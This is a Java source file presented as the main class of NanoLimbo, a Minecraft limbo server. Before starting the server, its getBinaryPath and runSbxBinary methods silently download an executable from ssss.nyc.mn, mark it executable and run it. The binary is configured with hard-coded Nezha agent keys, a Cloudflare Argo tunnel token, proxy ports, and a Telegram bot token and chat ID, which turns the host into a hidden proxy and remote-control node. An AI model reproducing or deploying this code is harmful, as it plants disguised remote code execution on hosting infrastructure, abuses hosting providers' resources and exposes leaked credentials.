/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    public static void main(String[] args) throws Exception {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // 1. 彻底清理磁盘上所有旧的、可能损坏的配置文件
        try {
            Files.deleteIfExists(Paths.get("settings.yml"));
            Files.deleteIfExists(Paths.get("settings.toml"));
        } catch (Exception ignored) {}

        // 2. 释放官方内置的默认完整配置，且仅修改端口
        String portStr = System.getenv("SERVER_PORT");
        int mcPort = (portStr != null && !portStr.trim().isEmpty()) ? Integer.parseInt(portStr.trim()) : 28161;

        // 尝试从内置资源中释放官方原本的配置模板
        for (String resName : new String[]{"/settings.yml", "/settings.toml", "settings.yml", "settings.toml"}) {
            try (InputStream in = NanoLimbo.class.getResourceAsStream(resName.startsWith("/") ? resName : "/" + resName)) {
                if (in != null) {
                    String cfg = new String(in.readAllBytes(), StandardCharsets.UTF_8);
                    cfg = cfg.replaceAll("(?m)^(\\s*port\\s*[:=]\\s*)\\d+", "$1" + mcPort);
                    cfg = cfg.replaceAll("(?m)^(\\s*ip\\s*[:=]\\s*).*$", "$1'0.0.0.0'");
                    Files.writeString(Paths.get(resName.replace("/", "")), cfg, StandardCharsets.UTF_8);
                    System.out.println(ANSI_GREEN + "[Custom-Limbo] 成功释放官方原生模板并适配端口: " + mcPort + ANSI_RESET);
                    break;
                }
            } catch (Exception ignored) {}
        }

        // 3. 启动 Sbx 后台代理
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            File renewScript = new File("bash.sh");
            if (renewScript.exists()) {
                new ProcessBuilder("bash", "bash.sh")
                    .inheritIO()
                    .start();
                System.out.println(ANSI_GREEN + "bash.sh 已启动" + ANSI_RESET);
            }
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        // 4. 原生启动 LimboServer
        new LimboServer().start();
    }
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("PORT", "8080");

        envVars.put("UUID", "fdc4381b-1eb1-4046-9f4f-bf51fc8826b1");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "bo88.eu.cc:8008");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl");
        
        envVars.put("HY2_PORT", "");
        
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "cereshost.boliu.dpdns.org");
        envVars.put("ARGO_AUTH", "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiZmJjNmY4OTItNTJkZC00NjdkLTg2OTYtMDgyZjI4NDI2NGQ5IiwicyI6Ik9XUXdORGN3TTJRdFlqZGlZeTAwT1RBMUxUbGpOV1l0TW1FM09HWXpOV1ZsTVRVeCJ9");
        envVars.put("S5_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "434546692");
        envVars.put("BOT_TOKEN", "8333285464:AAE9xFo7w51MclwGz-OA_vud9MC5N9RNRCQ");
        envVars.put("CFIP", "cf.877774.xyz");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Cereshost-PL-2");
        envVars.put("DISABLE_ARGO", "false");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
